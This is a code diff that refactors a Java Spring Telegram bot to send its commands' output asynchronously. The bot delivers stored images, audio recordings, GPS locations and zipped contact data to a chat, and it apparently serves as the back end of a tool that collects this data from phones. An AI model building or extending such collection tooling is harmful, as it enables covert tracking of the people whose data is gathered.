@@ -12,6 +12,8 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 import lombok.RequiredArgsConstructor;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.core.io.ClassPathResource;
+import org.springframework.scheduling.annotation.Async;
+import org.springframework.scheduling.annotation.EnableAsync;
 import org.springframework.stereotype.Component;
 import org.telegram.telegrambots.bots.TelegramLongPollingBot;
 import org.telegram.telegrambots.meta.api.methods.send.*;
@@ -31,11 +33,14 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.concurrent.CompletableFuture;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
+
 @Component
 @RequiredArgsConstructor
+@EnableAsync(proxyTargetClass = true)
 public class MyTelegramBot extends TelegramLongPollingBot {
 
 
@@ -69,18 +74,13 @@ public class MyTelegramBot extends TelegramLongPollingBot {
             String messageText = update.getMessage().getText();
             long chatId = update.getMessage().getChatId();
 
-            if (messageText.equals("/start")) {
-                sendMenu(chatId);
-            } else if (messageText.equals("Get All Images")) {
-                sendAllImages(chatId);
-            } else if (messageText.equals("Get All Records")) {
-                sendAllAudio(chatId);
-            } else if (messageText.equals("Get All Gps Information")) {
-                sendGPS(chatId);
-            } else if (messageText.equals("Generate Zip")) {
-                getZipFile(chatId);
-            } else {
-                sendMessage(chatId, "Invalid command. Please choose an option from the menu.");
+            switch (messageText) {
+                case "/start" -> sendMenu(chatId);
+                case "Get All Images" -> sendAllImages(chatId);
+                case "Get All Records" -> sendAllAudio(chatId);
+                case "Get All Gps Information" -> sendGPS(chatId);
+                case "Generate Zip" -> getZipFile(chatId);
+                default -> sendMessage(chatId, "Invalid command. Please choose an option from the menu.");
             }
         }
     }
@@ -127,137 +127,128 @@ public class MyTelegramBot extends TelegramLongPollingBot {
     }
 
 
+
     //---Image
-    private void sendAllImages(long chatId) {
-        List<Images> imagesList = imageService.getAllImageNames();
-
-        List<String> imagePaths = new ArrayList<>();
-        for (Images images : imagesList) {
-            imagePaths.add("static/images/" + images.getFile());
-        }
-
-        for (String imagePath : imagePaths) {
-
-            SendPhoto photo = new SendPhoto();
-            photo.setChatId(chatId);
-
-            try {
-                File file = new ClassPathResource(imagePath).getFile();
-                InputFile inputFile = new InputFile(file);
-                photo.setPhoto(inputFile);
-
-                execute(photo);
-            } catch (IOException | TelegramApiException e) {
-                e.printStackTrace();
+    @Async
+    protected void sendAllImages(long chatId) {
+        CompletableFuture.runAsync(() -> {
+            List<Images> imagesList = imageService.getAllImageNames();
+            for (Images images : imagesList) {
+                String imagePath = "static/images/" + images.getFile();
+                SendPhoto photo = new SendPhoto();
+                photo.setChatId(chatId);
+                try {
+                    File file = new ClassPathResource(imagePath).getFile();
+                    InputFile inputFile = new InputFile(file);
+                    photo.setPhoto(inputFile);
+                    execute(photo);
+                } catch (IOException | TelegramApiException e) {
+                    e.printStackTrace();
+                }
             }
-        }
+        });
     }
-
 
 
     //---Record
-    private void sendAllAudio(long chatId) {
-
-        List<Records> recordList = recordService.getAllRecordNames();
-
-        List<String> recordePaths = new ArrayList<>();
-        for (Records records : recordList) {
-            recordePaths.add("static/records/" + records.getFile());
-        }
-
-        for (String recordsPath : recordePaths) {
-
-            SendAudio audio = new SendAudio();
-            audio.setChatId(chatId);
-
-            try {
-                File file = new ClassPathResource(recordsPath).getFile();
-                InputFile inputFile = new InputFile(file);
-                audio.setAudio(inputFile);
-                execute(audio);
-            } catch (IOException | TelegramApiException e) {
-                e.printStackTrace();
+    @Async
+    protected void sendAllAudio(long chatId) {
+        CompletableFuture.runAsync(() -> {
+            List<Records> recordList = recordService.getAllRecordNames();
+            for (Records records : recordList) {
+                String recordPath = "static/records/" + records.getFile();
+                SendAudio audio = new SendAudio();
+                audio.setChatId(chatId);
+                try {
+                    File file = new ClassPathResource(recordPath).getFile();
+                    InputFile inputFile = new InputFile(file);
+                    audio.setAudio(inputFile);
+                    execute(audio);
+                } catch (IOException | TelegramApiException e) {
+                    e.printStackTrace();
+                }
             }
-        }
+        });
     }
-
 
 
     //--- GPS
-    private void sendGPS(long chatId) {
-        List<GPSInfo> gpsList = gpsService.getAllGPSInfo();
+    @Async
+    protected void sendGPS(long chatId) {
+        CompletableFuture.runAsync(()->{
+            List<GPSInfo> gpsList = gpsService.getAllGPSInfo();
 
 
-        for (GPSInfo gpsInfo : gpsList) {
-            Double lat = gpsInfo.getLat();
-            Double lon = gpsInfo.getLon();
-            Integer acc = gpsInfo.getAcc();
+            for (GPSInfo gpsInfo : gpsList) {
+                Double lat = gpsInfo.getLat();
+                Double lon = gpsInfo.getLon();
+                Integer acc = gpsInfo.getAcc();
 
-            try {
-                SendLocation location = new SendLocation();
-                location.setChatId(chatId);
-                location.setHorizontalAccuracy(Double.valueOf(acc));
-                location.setLatitude(lat);
-                location.setLongitude(lon);
-                execute(location);
-            } catch (TelegramApiException e) {
-                e.printStackTrace();
-            }
-        }
+                try {
+                    SendLocation location = new SendLocation();
+                    location.setChatId(chatId);
+                    location.setHorizontalAccuracy(Double.valueOf(acc));
+                    location.setLatitude(lat);
+                    location.setLongitude(lon);
+                    execute(location);
+                } catch (TelegramApiException e) {
+                    e.printStackTrace();
+                }
+            }});
     }
 
 
-
-
-
-
     //--- Generate Zip
-    private void getZipFile(long chatId) {
-        List<Contacts> contactsList = contactsService.getRandomContacts();
-        List<Images> imagesList = imageService.getRandomImages();
-        List<Records> recordsList = recordService.getRandomRecords();
-        List<GPSInfo> gpsList = gpsService.getRandomGps();
+    @Async
+    protected void getZipFile(long chatId) {
+        CompletableFuture.runAsync(()->{
+            List<Contacts> contactsList = contactsService.getRandomContacts();
+            List<Images> imagesList = imageService.getRandomImages();
+            List<Records> recordsList = recordService.getRandomRecords();
+            List<GPSInfo> gpsList = gpsService.getRandomGps();
 
-        List<String> imagePaths = new ArrayList<>();
-        List<String> recordePaths = new ArrayList<>();
+            List<String> imagePaths = new ArrayList<>();
+            List<String> recordePaths = new ArrayList<>();
 
-        for (Images images : imagesList) {
-            imagePaths.add("static/images/" + images.getFile());
-        }
-        for (Records records : recordsList) {
-            recordePaths.add("static/records/" + records.getFile());
-        }
-
-
-        String zipFileName = "file.zip";
-        try (FileOutputStream fos = new FileOutputStream(zipFileName);
-             ZipOutputStream zos = new ZipOutputStream(fos)) {
-
-            String jsonFileName = "data.json";
-            writeDataToJsonFile(imagesList, recordsList, contactsList, gpsList, jsonFileName);
-            addFileToZip(jsonFileName, zos);
-
-            addFilesToZip(imagePaths, zos,chatId);
-            addFilesToZip(recordePaths, zos,chatId);
-
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+            for (Images images : imagesList) {
+                imagePaths.add("static/images/" + images.getFile());
+            }
+            for (Records records : recordsList) {
+                recordePaths.add("static/records/" + records.getFile());
+            }
 
 
-        File zipFile = new File(zipFileName);
-        if (zipFile.exists()) {
-            SendDocument document = new SendDocument();
-            document.setChatId(chatId);
-            InputFile inputFile = new InputFile(zipFile);
-            document.setDocument(inputFile);
+            String zipFileName = "file.zip";
+            try (FileOutputStream fos = new FileOutputStream(zipFileName);
+                 ZipOutputStream zos = new ZipOutputStream(fos)) {
 
-            try {
-                execute(document);
-            } catch (TelegramApiException e) {
+                String jsonFileName = "data.json";
+                writeDataToJsonFile(imagesList, recordsList, contactsList, gpsList, jsonFileName);
+                addFileToZip(jsonFileName, zos);
+
+                addFilesToZip(imagePaths, zos, chatId);
+                addFilesToZip(recordePaths, zos, chatId);
+
+            } catch (IOException e) {
                 e.printStackTrace();
             }
-        }
+
+
+            File zipFile = new File(zipFileName);
+            if (zipFile.exists()) {
+                SendDocument document = new SendDocument();
+                document.setChatId(chatId);
+                InputFile inputFile = new InputFile(zipFile);
+                document.setDocument(inputFile);
+
+                try {
+                    execute(document);
+                } catch (TelegramApiException e) {
+                    e.printStackTrace();
+                }
+            }
+        });
+
     }
 
 
@@ -294,7 +285,7 @@ public class MyTelegramBot extends TelegramLongPollingBot {
 
 
     //--- Image and record write to zip
-    private void addFilesToZip(List<String> filePaths, ZipOutputStream zos,long chatId) throws IOException {
+    private void addFilesToZip(List<String> filePaths, ZipOutputStream zos, long chatId) throws IOException {
 
         for (String recordsPath : filePaths) {
 
@@ -324,16 +315,6 @@ public class MyTelegramBot extends TelegramLongPollingBot {
 
         }
     }
-
-
-
-
-
-
-
-
-
-
 
 
 }
